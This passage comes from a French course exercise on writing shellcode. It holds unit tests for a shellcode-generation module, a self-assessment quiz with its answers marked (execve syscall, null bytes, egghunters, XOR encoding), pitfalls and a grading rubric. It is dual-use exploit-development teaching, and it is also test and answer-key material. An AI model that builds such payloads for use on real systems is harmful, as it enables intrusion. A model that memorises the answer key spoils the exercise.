        clean = bytes([0x41, 0x42, 0x43])
        dirty = bytes([0x00, 0x41])

        clean_result = self.check(clean, b'\x00')
        dirty_result = self.check(dirty, b'\x00')

        self.assertFalse(clean_result["has_bad_chars"])
        self.assertTrue(dirty_result["has_bad_chars"])


class TestNOPSledMutations(unittest.TestCase):
    """Tests de mutation pour le NOP sled."""

    def setUp(self):
        from shellcode_forger import generate_nop_sled
        self.generate = generate_nop_sled

    # Mutant 10: Wrong NOP sled length
    def test_mutant_sled_length(self):
        """MUTANT: NOP sled wrong length."""
        for length in [50, 100, 200]:
            sled = self.generate(length, "classic")
            self.assertEqual(len(sled), length,
                           f"NOP sled should be exactly {length} bytes")


if __name__ == "__main__":
    unittest.main(verbosity=2)
```

---

## Section 6 : QCM d'Auto-Évaluation

### Question 1
**Quel syscall Linux x86-64 est utilisé pour execve ?**

- [ ] A) 11
- [ ] B) 33
- [x] C) 59
- [ ] D) 60

**Explication**: Sur Linux x86-64, execve est le syscall numéro 59. Le numéro 11 est pour execve en x86 32-bit, 60 est exit.

---

### Question 2
**Pourquoi éviter les null bytes (0x00) dans un shellcode ?**

- [ ] A) Ils prennent trop de place
- [x] B) Ils terminent les chaînes C (strcpy, gets, etc.)
- [ ] C) Ils sont illégaux en assembleur
- [ ] D) Ils ralentissent l'exécution

**Explication**: Les fonctions de manipulation de chaînes C comme strcpy, gets, sprintf traitent 0x00 comme un terminateur de chaîne, tronquant le shellcode.

---

### Question 3
**Que fait un egghunter ?**

- [ ] A) Cherche des vulnérabilités
- [ ] B) Encode le shellcode
- [x] C) Cherche un tag (egg) en mémoire pour trouver le shellcode principal
- [ ] D) Vérifie l'intégrité du shellcode

**Explication**: L'egghunter est un petit shellcode qui scanne la mémoire à la recherche d'un tag (egg) qui précède le shellcode principal, utile quand le buffer est trop petit.

---

### Question 4
**Comment fonctionne l'encodage XOR ?**

- [ ] A) Il compresse le shellcode
- [x] B) Chaque byte est XORé avec une clé, le decoder fait l'opération inverse
- [ ] C) Il chiffre le shellcode de manière irréversible
- [ ] D) Il convertit en base64

**Explication**: L'encodage XOR est réversible (A XOR B XOR B = A). Un decoder stub XOR à nouveau avec la même clé pour récupérer le shellcode original.

---

### Question 5
**Qu'est-ce que la technique JMP-CALL-POP ?**

- [ ] A) Une technique d'exploitation
- [x] B) Une méthode pour obtenir l'adresse du shellcode de façon position-independent
- [ ] C) Un type de gadget ROP
- [ ] D) Une technique d'évasion

**Explication**: JMP-CALL-POP permet d'obtenir l'adresse du shellcode encodé sans connaître l'adresse absolue. CALL push l'adresse de retour, que POP récupère.

---

### Question 6
**Pourquoi l'egg est-il répété deux fois dans un payload egghunter ?**

- [ ] A) Pour redondance
- [x] B) Pour éviter que l'egghunter se trouve lui-même
- [ ] C) Pour alignement mémoire
- [ ] D) Pour augmenter la fiabilité

**Explication**: L'egghunter contient l'egg dans son code. En cherchant egg+egg (8 bytes), il évite de se trouver lui-même et trouve uniquement le vrai shellcode.

---

## Section 7 : Conseils et Pièges

### Pièges Courants

1. **Oublier l'alignement stack**: Le syscall peut nécessiter un RSP aligné.

2. **Hardcoder des adresses**: Le shellcode doit être position-independent.

3. **Decoder stub avec bad chars**: Le stub aussi doit éviter les bad chars.

4. **Egg trop commun**: Choisir un egg unique pour éviter les faux positifs.

### Bonnes Pratiques

```python
# Toujours vérifier les bad chars après encodage
def safe_encode(shellcode, bad_chars):
    key = find_xor_key(shellcode, bad_chars)
    if key is None:
        raise ValueError("No valid key found")

    result = encode_xor(shellcode, bytes([key]), bad_chars)

    # Vérification finale
    check = check_bad_chars(result.final_shellcode, bad_chars)
    if check["has_bad_chars"]:
        raise ValueError("Encoding failed: bad chars still present")

    return result
```

---

## Section 8 : Ressources et Références

### Documentation
- Linux syscall table: filippo.io/linux-syscall-table/
- x86-64 instruction reference: felixcloutier.com/x86/

### Outils
- Shell-storm shellcode database: shell-storm.org/shellcode/
- alpha2/alpha3: Alphanumeric shellcode encoders

---

## Barème de Notation

| Critère | Points |
|---------|--------|
| generate_execve_shellcode | 20 |
| encode_xor / find_xor_key | 25 |
| generate_egghunter | 20 |
| check_bad_chars | 15 |
| generate_nop_sled | 10 |
| build_payload | 10 |
| **Total** | **100** |
